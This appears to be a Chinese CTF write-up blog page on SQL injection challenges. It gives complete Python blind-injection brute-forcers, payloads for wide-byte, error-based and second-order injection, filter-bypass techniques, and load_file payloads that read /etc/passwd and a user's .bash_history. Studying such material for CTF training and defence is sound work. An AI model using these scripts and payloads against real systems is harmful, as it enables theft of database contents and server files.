<h3 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h3><p><code>if(1=1,1,2)</code>测试有回显，于是写脚本爆破</p>
<pre class="language-python" data-language="python"><code class="language-python">
import requests

url &#x3D; &quot;http:&#x2F;&#x2F;228a1e37-3bc0-4272-ac01-c99d47dfd854.node3.buuoj.cn&#x2F;?stunum&#x3D;&quot;
result &#x3D; &quot;&quot;


# if(ascii(mid((select&#x2F;**&#x2F;database()),&#123;&#125;,1))&gt;&#123;&#125;,1,2)    ctf
# if(ascii(mid((select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;,1,2)     flag,score
# if(ascii(mid((select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;),&#123;&#125;,1))&gt;&#123;&#125;,1,2)         flag,value
# if(ascii(mid((select&#x2F;**&#x2F;value&#x2F;**&#x2F;from&#x2F;**&#x2F;flag),&#123;&#125;,1))&gt;&#123;&#125;,1,2)

payload &#x3D; &quot;if(ascii(mid((select&#x2F;**&#x2F;value&#x2F;**&#x2F;from&#x2F;**&#x2F;flag),&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;

for i in range(0, 100):
    high &#x3D; 127
    low &#x3D; 32
    mid &#x3D; (low + high) &#x2F;&#x2F; 2
    while high &gt; low:
        payloads &#x3D; payload.format(i, mid)
        html &#x3D; requests.get(url + payloads)
        if &#39;admin&#39; in html.text:
            low &#x3D; mid + 1
        else:
            high &#x3D; mid
        mid &#x3D; (low + high) &#x2F;&#x2F; 2
    result +&#x3D; chr(int(mid))
    print(result)</code></pre>

<p>注出flag</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="WEB-Login-Only-For-36D"><a href="#WEB-Login-Only-For-36D" class="headerlink" title="WEB_Login_Only_For_36D"></a>WEB_Login_Only_For_36D</h3><p>界面：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210354938.png" alt loading="lazy"></p>
<p><strong>F12</strong>可以看到<strong>hint</strong></p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210443551.png" alt loading="lazy"></p>
<p>可以看到这里需要username匹配admin，随后才可以输入密码，先在<strong>password</strong>处<strong>fuzz</strong>一下</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210743129.png" alt loading="lazy"></p>
<p>过滤了单引号，如果password中要用单引号闭合的话显然很难这里就需要从username入手，详情可以参考上面的<code>BJDCTF-2nd—简单注入</code>，和p神和Smi1e师傅的文章：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/">[小密圈]经典写配置漏洞与几种变形学习</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">经典写配置漏洞与几种变形</a></li>
</ul>
<p>这里直接给出payload：<code>username=admin%0a\&amp;password=/**/or/**/if(left((password),1)REGEXP/**/binary/**/&quot;I&quot;,sleep(3),1)#</code></p>
<p>exp如下：</p>
<pre class="language-php" data-language="php"><code class="language-php">import requests
url &#x3D; &quot;https:&#x2F;&#x2F;bbafd3a8-7f89-4adf-84c2-7028b93775cc.chall.ctf.show&#x2F;&quot;
header &#x3D; &#123;
    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0&quot;,
    &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,
    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;
&#125;
str1 &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;
passwd &#x3D; &#39;&#39;
for i in range(1, 40):
    for j in str1:
        exp &#x3D; passwd + j
        payload &#x3D; &#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;if(left((password),&#123;&#125;)REGEXP&#x2F;**&#x2F;binary&#x2F;**&#x2F;&quot;^&#123;&#125;&quot;,sleep(3),1)#&#39;.format(i, exp)
        data &#x3D; &#123;
            &#39;username&#39;: &#39;admin%0a\\&#39;,
            &#39;password&#39;: payload
        &#125;
        r &#x3D; requests.post(url,data&#x3D;data,headers&#x3D;header)
        if r.elapsed.total_seconds()&gt;1:
            passwd &#x3D; passwd + j
            print(j,end&#x3D;&#39;&#39;)
            break</code></pre>

<p>这里需要注意以下几点：</p>
<ul>
<li><code>binary</code>匹配大小写</li>
<li><code>mid</code>和<code>substr</code>被过滤了用<code>left</code></li>
<li>空格用<code>/**/</code></li>
</ul>
<p>随后就可以跑出密码登录即可得到<code>flag</code></p>
<h3 id="XCTF—INSERT-INTO注入"><a href="#XCTF—INSERT-INTO注入" class="headerlink" title="XCTF—INSERT INTO注入"></a>XCTF—INSERT INTO注入</h3><p><strong>解题核心</strong>—————–substr(),x-forwarded-for头注入</p>
<p>平台：[bugku INSERT INTO注入](<a target="_blank" rel="noopener" href="https://ctf.bugku.com/challenges#INSERT">https://ctf.bugku.com/challenges#INSERT</a> INTO注入)题目链接：<a target="_blank" rel="noopener" href="http://123.206.87.240:8002/web15/">http://123.206.87.240:8002/web15/</a></p>
<p>在题目的下方给了源码：</p>
<pre class="language-php" data-language="php"><code class="language-php">flag格式：flag&#123;xxxxxxxxxxxx&#125;
不如写个Python吧

error_reporting(0);

function getIp()&#123;
$ip &#x3D; &#39;&#39;;
if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;
$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
&#125;else&#123;
$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];
&#125;
$ip_arr &#x3D; explode(&#39;,&#39;, $ip);
return $ip_arr[0];

&#125;

$host&#x3D;&quot;localhost&quot;;
$user&#x3D;&quot;&quot;;
$pass&#x3D;&quot;&quot;;
$db&#x3D;&quot;&quot;;

$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);

mysql_select_db($db) or die(&quot;Unable to select database&quot;);

$ip &#x3D; getIp();
echo &#39;your ip is :&#39;.$ip;
$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;
mysql_query($sql);</code></pre>

<p>通过观察代码可以发现变量<code>$ip</code>可以通过更改<code>X-Forwarded-For</code>头进行更改，且后面的代码把每一次查询的ip都插入的数据库，推测<code>$ip</code>处存在注入点，于是burp抓包判断注入点：</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/OZAFpjoRIb1Wyig.png" style="zoom: 50%;" loading="lazy">

<p>利用延时注入验证此处确实存在注入点，于是开始构造注入函数，代码<code>$ip_arr = explode(&#39;,&#39;, $ip);</code>通过逗号将ip分离开，只取第一个，所以这里相当于过过滤了逗号注入符号，于是我们通常用的<code>mid</code>、<code>substr</code>，<code>if</code>判断在这里用不了了，在这里用以下注入方法替换：</p>
<p><code>if(sql,num,str)</code>可替换成<code>case when sql then sleep(5) else 1 end</code></p>
<p><code>sql</code>注入语句中的<code>substr</code>语句可以写成：<code>substr(sql from num for 1) = str</code>，将语句中的逗号替换成了<code>from</code>和<code>for</code>，语句照常进行，<code>mid</code>函数也可以这样</p>
<p>Payload1：<code>127.0.0.1&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>client_ip</code>,<code>flag</code></p>
<p>Payload2：<code>127.0.0.1&#39;and (case when (substr((select group_concat(column_name) from information_schema.columns where table_schema=&#39;flag&#39;) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>flag</code>中的<code>flag</code>列</p>
<p>Payload3：<code>127.0.0.1&#39;and (case when (substr((select group_concat(flag) from flag) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到<code>flag</code>列中的<code>flag</code></p>
<p>python脚本如下：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.-&quot;
url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&quot;
for i in range(0,40):
    for j in str:
        data &#x3D; &quot;此处为Payload&quot;.format(i,j)
        header &#x3D; &#123;&quot;x-forwarded-for&quot;:data&#125;
        r &#x3D; requests.get(url,headers&#x3D;header)
        if r.elapsed.total_seconds()&gt;1:
            print(j,end &#x3D; &#39;&#39;)
            break</code></pre>

<h3 id="2020ichunqiu新春公益赛—盲注"><a href="#2020ichunqiu新春公益赛—盲注" class="headerlink" title="2020ichunqiu新春公益赛—盲注"></a>2020ichunqiu新春公益赛—盲注</h3><p>首先点进去的界面：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
    # flag在fl4g里
    include &#39;waf.php&#39;;
    header(&quot;Content-type: text&#x2F;html; charset&#x3D;utf-8&quot;); 
    $db &#x3D; new mysql();

    $id &#x3D; $_GET[&#39;id&#39;];

    if ($id) &#123;
        if(check_sql($id))&#123;
            exit();
        &#125; else &#123;
            $sql &#x3D; &quot;select * from flllllllag where id&#x3D;$id&quot;;
            $db-&gt;query($sql);
        &#125;
    &#125;
    highlight_file(__FILE__);</code></pre>

<p>可以看到需要我们get一个id参数来绕过waf里的check_sql函数完成注入，并且<code>flag</code>在<code>fl4g</code>里</p>
<p>首先题目过滤了select，fuzz后发现以下字符和函数被过滤</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/gKbs6mkaDcpUx5W.png" style="zoom: 80%;" loading="lazy">

<p>发现<code>sleep</code>函数并没有被过滤，于是想到延时注入，<code>=</code>、<code>like</code>、<code>rlike</code>被过滤用<code>regexp</code>函数代替</p>
<p>regexp后所跟的东西作为正则表达式处理。</p>
<p>Payload：<code>id=1 and if(ascii(mid(fl4g,1,1))regexp 102,sleep(3),1)</code></p>
<p>于是写出盲注注入脚本</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url &#x3D; &quot;http:&#x2F;&#x2F;c6a55177986a42829935671bc7988fbd1a2652564f754cac.changame.ichunqiu.com&#x2F;?id&#x3D;&quot;
for i in range(1,100):
    for j in range(45,128):
        if j&lt;58 or j&gt;96:
        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;
            d &#x3D; &quot;1 and if(ascii(mid(fl4g,&quot;+str(i)+&quot;,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;
            r &#x3D; requests.get(url+d)
            if r.elapsed.total_seconds()&gt;1:
                print(chr(j),end&#x3D;&#39;&#39;)
                break</code></pre>

<h3 id="网鼎杯2018—Unfinish"><a href="#网鼎杯2018—Unfinish" class="headerlink" title="网鼎杯2018—Unfinish"></a>网鼎杯2018—Unfinish</h3><p>登录用的邮箱和密码，注册可以注册邮箱账号和密码，并且在登录后的index.php处有显示注册的用户名，用户名存入了数据库，于是推测在register.php处存在注入点，测试后发现过滤了逗号和information，不过可以用from和for代替，payload：<code>0&#39; or (case when (substr((select * from flag) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end) or &#39;1</code>，注意这里判断响应时间的时候要用time库，平常用的<code>elapsed.total_seconds()</code>在这里好像不管用，测试后发现这个函数获得的是最后一次请求的响应时间，而题目中的register.php注册成功会重定向到login.php，于是会导致结果输出不出来，于是改用time库</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
import time
str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,&#123;&#125;_!@#$%^&amp;*.-&quot;
url &#x3D; &quot;http:&#x2F;&#x2F;221e6a91-2118-48a2-832a-a910da7b4e1b.node3.buuoj.cn&#x2F;register.php&quot;
header &#x3D; &#123;
    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0&quot;,
    &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,
    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;
&#125;
for i in range(0,50):
    for j in str:
        payload &#x3D; &quot;0&#39; or (case when (substr((select * from flag) from &#123;&#125; for 1 )&#x3D;&#39;&#123;&#125;&#39;) then sleep(3) else 1 end) or &#39;1&quot;.format(i,j)
        #print(payload)
        data &#x3D; &#123;
            &quot;email&quot;:&quot;111@111&quot;,
            &quot;username&quot;:payload,
            &quot;password&quot;:&quot;aaa&quot;
        &#125;
        startTime&#x3D;time.time()
        r &#x3D; requests.post(url,data&#x3D;data,headers&#x3D;header)
        #print(r.status_code)
        #print(r.text)
        if time.time()-startTime&gt;1:
            print(j,end &#x3D; &#39;&#39;)
            break</code></pre>

<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="2020ichunqiu新春公益赛—easysqli-copy"><a href="#2020ichunqiu新春公益赛—easysqli-copy" class="headerlink" title="2020ichunqiu新春公益赛—easysqli_copy"></a>2020ichunqiu新春公益赛—easysqli_copy</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/216336.html">参考1</a> ，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3950">参考2</a></p>
<p>界面代码：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php 
    function check($str)
    &#123;
        if(preg_match(&#39;&#x2F;union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database&#x2F;i&#39;,$str,$matches))
        &#123;
            print_r($matches);
            return 0;
        &#125;
        else
        &#123;
            return 1;
        &#125;
    &#125;
    try
    &#123;
        $db &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;pdotest&#39;,&#39;root&#39;,&#39;******&#39;);
    &#125; 
    catch(Exception $e)
    &#123;
        echo $e-&gt;getMessage();
    &#125;
    if(isset($_GET[&#39;id&#39;]))
    &#123;
        $id &#x3D; $_GET[&#39;id&#39;];
    &#125;
    else
    &#123;
        $test &#x3D; $db-&gt;query(&quot;select balabala from table1&quot;);
        $res &#x3D; $test-&gt;fetch(PDO::FETCH_ASSOC);
        $id &#x3D; $res[&#39;balabala&#39;];
    &#125;
    if(check($id))
    &#123;
        $query &#x3D; &quot;select balabala from table1 where 1&#x3D;?&quot;;
        $db-&gt;query(&quot;set names gbk&quot;);
        $row &#x3D; $db-&gt;prepare($query);
        $row-&gt;bindParam(1,$id);
        $row-&gt;execute();
    &#125;</code></pre>

<p> <code>$db-&gt;query(&quot;set names gbk&quot;);</code>这个语句构成了宽字节注入，即可以利用<code>%d5&#39;</code>闭合单引号形成宽字节注入，闭合单引号后后面的语句就是可控的了，所以后面只需要构造注入语句绕过waf即可，过滤的绝大多数字符，于是这里使用<code>prepare</code>预编译注入</p>
<p>格式：<code>set @a=执行的语句;prepare ctftest from @a; execute ctftest;</code>，该格式支持十六进制编码和ascii编码注入，于是就可以进行绕过</p>
<p>于是就可以用该预编译注入+延时注入+布尔盲注来爆出所有内容</p>
<p>爆列Payload：<code>select if(ascii(mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;table1&#39;),&#123;&#125;,1))= &#123;&#125;,sleep(3),1)</code></p>
<p>爆字段payload：<code>select if(ascii(mid((select group_concat(fllllll4g,&#39;&#39;) from table1),&#123;&#125;,1))= &#123;&#125;,sleep(3),1)</code></p>
<p>写出盲注脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url &#x3D; &quot;http:&#x2F;&#x2F;8e2a5a61db69418f8ebe1c973c4bdecfa176617cfa094611.changame.ichunqiu.com&#x2F;?id&#x3D;&quot;
def str_to_hex(s):
    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])
for i in range(1,100):
    for j in range(45,128):
        d &#x3D; &quot;(This is Payload)&quot;.format(i,j)
        payload &#x3D; str_to_hex(d)
        a &#x3D; &quot;%df%27;set @a&#x3D;0x&#123;&#125;;prepare a from @a; execute a;&quot;.format(payload)
        r &#x3D; requests.get(url+a)
        if r.elapsed.total_seconds()&gt;1:
            print(chr(j),end&#x3D;&#39;&#39;)
            break</code></pre>

<p>得到<code>table1</code>表中的列：<code>balabala,eih@y,fllllll4g,bbb</code>,最终在<code>fllllll4g</code>列中得到flag</p>
<h3 id="安恒杯-新春祈福赛—BabySqliv2-0"><a href="#安恒杯-新春祈福赛—BabySqliv2-0" class="headerlink" title="安恒杯-新春祈福赛—BabySqliv2.0"></a>安恒杯-新春祈福赛—BabySqliv2.0</h3><p><strong>解题核心</strong>—————–异或注入，报错注入，宽字节注入</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/g86QP1C5ZsThjan.png" alt loading="lazy"></p>
<p>界面的上题一样，发现只要用admin账号登录，无论用什么密码都能登录进去，登进去后界面如下</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200202205759631.png" alt loading="lazy"></p>
<p>于是在登录界面测试，单引号注入无效，猜测转义了单引号，利用宽字节注入，果不其然，于是利用报错注入</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/4cPp1rotWQnUvew.png" alt loading="lazy"></p>
<p>文章参考：<a target="_blank" rel="noopener" href="https://www.gem-love.com/websecurity/467.html">简析GXY_CTF “BabySqli v2.0”宽字节注入</a></p>
<p>报错注入有三种方法：floor()，extractvalue()，updatexml()，这里采用extractvalue()报错注入：</p>
<p>查库：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(seselectlect(group_concat(database())))));--+</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/KDtnXxQcPvYRGV6.png" alt loading="lazy"></p>
<p>查表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect(group_concat(table_name))from(information_schema.tables)whewherere((table_schema)&#x3D;database()))));--+</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/YvlyLpUX7qZESNP.png" alt loading="lazy"></p>
<p>由此可知flag应该在f14g中</p>
<p>查字段：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect(group_concat(column_name))from(information_schema.columns)whwhereere((table_name)&#x3D;char(102,49,52,103)))));--+</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/hIfBtkgzYT4qNOa.png" alt loading="lazy"></p>
<blockquote>
<p>注：这里应该是过滤了列的直接查询，用char()函数进行绕过即可</p>
</blockquote>
<p>解密MD5值后为id</p>
<p>id列查询：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect group_concat(b80bb7740288fda1f201890375a60c8f) from f14g)))--+</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/9wQR4Un3pDref1W.png" alt loading="lazy"></p>
<p>还真全是id了，看大佬博客后发现居然还可以盲猜flag？？？</p>
<p>flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc</p>
<p>flag列查询：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g)))--+</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xoZzpbPdajKuqD3.png" alt loading="lazy"></p>
<p>base64解密后为“The first man name was k”。。。。。。。。。。</p>
<p>配合limit进行查询，在limit 22,1处发现flag</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1)))--+</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/PXqxeEV3Hvp7cRw.png" alt loading="lazy"></p>
<p>解码后只显示前面的flag，应该是前端界面限制了字符串的显示</p>
<p>于是用到substr()函数进行字符串的截取：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,substr((selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)))--+</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Qo3SelyJVt6qbkM.png" alt loading="lazy"></p>
<p>去掉相同的拼合起来base64解码后即可得到flag</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="网鼎杯-2018—Comment"><a href="#网鼎杯-2018—Comment" class="headerlink" title="网鼎杯 2018—Comment"></a>网鼎杯 2018—Comment</h3><p>上来先扫描一波，扫到了<code>.git</code>，<code>index.php</code>，<code>login.php</code>，<code>git</code>源码泄露，用<code>Githack</code>工具进行恢复</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161036570.png" alt loading="lazy"></p>
<p>发现case后的直接break了，什么操作都没有，估计这份代码不全，使用<code>git</code>进行恢复</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161519874.png" alt="image-20200509161519874" loading="lazy"></p>
<p>找到历史commit版本，进行代码恢复，得到最终<code>write_do.php</code>源码</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
include &quot;mysql.php&quot;;
session_start();
if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;
    header(&quot;Location: .&#x2F;login.php&quot;);
    die();
&#125;
if(isset($_GET[&#39;do&#39;]))&#123;
switch ($_GET[&#39;do&#39;])
&#123;
case &#39;write&#39;:
    $category &#x3D; addslashes($_POST[&#39;category&#39;]);
    $title &#x3D; addslashes($_POST[&#39;title&#39;]);
    $content &#x3D; addslashes($_POST[&#39;content&#39;]);
    $sql &#x3D; &quot;insert into board
            set category &#x3D; &#39;$category&#39;,
                title &#x3D; &#39;$title&#39;,
                content &#x3D; &#39;$content&#39;&quot;;
    $result &#x3D; mysql_query($sql);
    header(&quot;Location: .&#x2F;index.php&quot;);
    break;
case &#39;comment&#39;:
    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);
    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;
    $result &#x3D; mysql_query($sql);
    $num &#x3D; mysql_num_rows($result);
    if($num&gt;0)&#123;
    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];
    $content &#x3D; addslashes($_POST[&#39;content&#39;]);
    $sql &#x3D; &quot;insert into comment
            set category &#x3D; &#39;$category&#39;,
                content &#x3D; &#39;$content&#39;,
                bo_id &#x3D; &#39;$bo_id&#39;&quot;;
    $result &#x3D; mysql_query($sql);
    &#125;
    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);
    break;
default:
    header(&quot;Location: .&#x2F;index.php&quot;);
&#125;
&#125;
else&#123;
    header(&quot;Location: .&#x2F;index.php&quot;);
&#125;
?&gt;</code></pre>

<p><code>write</code>操作对应发帖，<code>comment</code>操作对应评论操作，但是在进行这些操作的前提是要登录上，于是我们看到登录界面：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161906786.png" alt loading="lazy"></p>
<p>两个提示似乎在暗示这什么，于是对密码的三个*出处进行爆破，得到密码<code>zhangwei666</code>成功登录，来到发帖界面，首先我们看发帖操作，用<code>addslashes</code>函数对参数进行了过滤，说到<code>addslashes</code>引发的安全问题可以查看这篇文章：<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-10899-1-1.html">https://bbs.ichunqiu.com/thread-10899-1-1.html</a></p>
<p>里面介绍了绕过<code>addslashes</code>函数的方法，但在这里似乎用不到，仔细观察代码，<code>addslashes</code>函数限制了我们对一些特殊符号的操作，使得sql语句能够正常的执行，但并没有改变插入到数据库中的数据，测试如下</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509163056815.png" alt loading="lazy"></p>
<p>可以看到并不会改变存入数据库中的内容，查询出里面的结果也是一样，于是我们再看到<code>commit</code>操作，里面的<code>mysql_fetch_array</code>函数在数据库中取出<code>category</code>字段中的内容，然后再直接进行了<code>insert into</code>存入评论数据的操作操作传入的参数<code>category</code>我们可，后面的<code>content</code>参数我们也可控于是就可以进行如下操作：</p>
<p>先传入<code>category</code>字段的值为<code>a&#39;,content=(select user()),/*</code>,前面的单引号虽然在存入数据库的过程中被转义了，但是数据库中华存的依旧是用来的内容，后面的取出来的时候也会将单引号原封不动的取出来，在进行<code>comment</code>的<code>insert into</code>操作时候，就会闭合前面的单引号，从而达到注入的目的，然后跟上的<code>content</code>值当然就是要进行<code>sql</code>注入查找数据的操作，然后再接上<code>/*</code>，这样我们后面再评论页面进行评论的时候传入<code>*/#</code>就能成功的和前面的闭合起来，总<code>payload</code>如下：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">insert into comment set category &#x3D; &#39;a&#39;,content&#x3D;(select user()),&#x2F;*&#39;,content &#x3D; &#39;*&#x2F;#&#39;,bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre>

<p>得到回显：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509164939746.png" alt loading="lazy"></p>
<p>尝试写马无果，应该是权限不够，然后再ctf数据库查到三个表<code>board,comment,user</code></p>
<p><code>user</code>表中有如下列</p>
<pre class="language-none"><code class="language-none">id,username,password,Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string</code></pre>

<p><code>board</code>表中有如下列</p>
<pre class="language-none"><code class="language-none">id,category,title,content</code></pre>

<p><code>comment</code>表中有如下列</p>
<pre class="language-none"><code class="language-none">id,bo_id,category,content</code></pre>

<p>经过一番查找后并没有发现存在<code>flag</code>的内容，看来<code>flag</code>并没在数据库中，不在数据库中那只能在文件中了，于是进行文件读取操作，根目录下并没有<code>flag</code>，于是我们左试右试都没发现<code>flag</code>，于是读取<code>/etc/passwd</code></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;etc&#x2F;passwd&#39;),&#x2F;*</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509170854625.png" alt loading="lazy"></p>
<p><code>/etc/passwd</code>文件描述参考：<a target="_blank" rel="noopener" href="http://www.suk1.top/2020/01/13/Linux_etc_passwd/#%E4%B8%BB%E7%9B%AE%E5%BD%95-%E5%92%8C-Shell">Linux passwd 文件详解</a></p>
<p>注意到最后一行，<code>www:x:500:500:www:/home/www:/bin/bash</code>www用户在<code>/home/www</code>的目录下进行了<code>/bin/bash</code>的<code>shell</code>操作，于是我们利用<code>.bash_history</code>查找用户使用过的历史命令</p>
<ul>
<li><code>.bash_history</code>：保存了当前用户使用过的历史命令,方便查找，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/caolaosanahnu/article/details/7601074">linux中Shell历史命令记录文件的路径是什么</a></li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;),&#x2F;*</code></pre>

